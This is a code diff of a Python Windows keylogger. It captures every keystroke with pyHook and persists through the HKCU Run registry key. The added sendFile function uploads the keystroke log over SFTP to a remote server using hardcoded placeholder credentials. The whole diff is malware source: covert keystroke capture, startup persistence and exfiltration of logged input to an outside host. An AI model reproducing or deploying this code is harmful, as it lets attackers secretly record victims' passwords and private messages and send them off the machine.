@@ -1,37 +1,37 @@
-import pyHook
+from pyHook import HookManager
 import pythoncom
-import sys
-import os
+from sys import exit as sysExit
+from sys import argv
+import paramiko
 
-import win32event
-import win32api
-import winerror
-import base64
+from win32event import CreateMutex
+from win32api import GetLastError
+from winerror import ERROR_ALREADY_EXISTS
 
-from _winreg import *  # For registry
-from checkURL import checkURL  # To check internet connectivity
+from _winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ  # For registry
 
-#from myEmail import *
-
-from Tkinter import *  # For GUI
+from Tkinter import Frame, Tk, Button  # For GUI
 
 from keyloggerClient import *  # Contains the ssh and sftp functions used to send back log.txt to the server
 
 data = ''  # To hold logged key
 exitStack = []
-hostAddress = '<Your host IP>'
+hostAddress = <Server IP>
+filename='log.txt'
+sshServerUsername = <server username>
+sshServerPassword = <server password>
 
 # Disallow multiple instances. source: ajinabraham/Xenotix-Python-Keylogger
-mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
-if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+mutex = CreateMutex(None, 1, 'mutex_var_xboz')
+if GetLastError() == ERROR_ALREADY_EXISTS:
     mutex = None
     print "Multiple Instance not Allowed"
-    sys.exit(0)
+    sysExit(0)
 
 
 def addToStartup():
     dirPath = os.getcwd()
-    progName = sys.argv[0].split("\\")[-1]
+    progName = argv[0].split("\\")[-1]
     dirPath = dirPath + '\\' + progName
     keyValue = r'Software\Microsoft\Windows\CurrentVersion\Run'
 
@@ -54,14 +54,6 @@ class Application(Frame):  # Class for implementation of exitGui
         self.CreateWidgets()
 
 
-def checkInternet():  # To check if client is connected to the internet
-    return checkURL()
-
-
-def checkHost(url):  # To check if host is reachable from the client
-    return checkURL(url=url)
-
-
 def OnKeyBoardEvent(event):
     global data
     global exitStack
@@ -69,7 +61,7 @@ def OnKeyBoardEvent(event):
     # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
     # logging.log(10,chr(event.Ascii))
 
-    if event.Ascii == 8:  # Exit on backspace
+    if event.Ascii == 8:
         key = '<BACKSPACE>'
     elif event.Ascii == 13:  # Carraige return representation
         key = '<ENTER>'
@@ -91,30 +83,24 @@ def OnKeyBoardEvent(event):
         if exitStack[0] == 8 and exitStack[1] == 0 and exitStack[2] == 8 and exitStack[3] == 0:  # If last four values
             app.mainloop()                                                                       # entered were <back><del><back><del>
             root.destroy()                                                                       # spawn a quit dialog box
-            mySSH.sshKill()
             #myEmail.killConnection()
-            sys.exit(1)
+            sysExit(1)
         else:
             exitStack = []
 
     if len(data) == 128:  # Write data in chunks of 128 bytes
         writeLogs()
-        if mySSH.checkAlive():
-            print mySSH.sendFile()
-        else:
-            print 'No SSH connection to host. Trying to initiate a new connection'
-            if checkInternet() and checkHost(url='http://'+hostAddress):  # Initiate ssh connection if internet is available and host is up
-                if mySSH.initiateConnection():
-                    print 'New SSH connection initialized'
-                    print mySSH.sendFile()
-                else:
-                    print 'Internet available and host is up but unable to initiate SSH connection. No means of sending file to host'
-            else:
-                'Internet unavailable or host unreachable'
+        sendFile()
         #myEmail.sendEmail()
         data=''
     return True
 
+def sendFile():
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(hostAddress, username=sshServerUsername, password=sshServerPassword)
+    sftp = client.open_sftp()
+    sftp.put('log.txt', '/root/Desktop/upload/log.txt')
 
 def writeLogs(name='log.txt'):
     global data
@@ -130,16 +116,10 @@ def writeLogs(name='log.txt'):
 #myEmail.prepareMessage()
 #myEmail.initiateConnection()
 addToStartup()
-mySSH = ssh()
-if checkInternet() and checkHost(url='http://'+hostAddress):  # Initiate ssh connection if internet is available and host is up
-    if mySSH.initiateConnection():
-        print 'Initial SSH connection initiated'
-    else:
-        print 'Initial SSH connection could not be initiated'
 
 root = Tk()                              # Tk Object
 app = Application(root)                  # Passing Tk object to our GUI implementation class
-hooks_manager = pyHook.HookManager()     # Create a hook
+hooks_manager = HookManager()            # Create a hook
 hooks_manager.KeyDown = OnKeyBoardEvent  # Assign keydown event handler
 hooks_manager.HookKeyboard()             # assign hook to the keyboard
-pythoncom.PumpMessages()             
+pythoncom.PumpMessages()
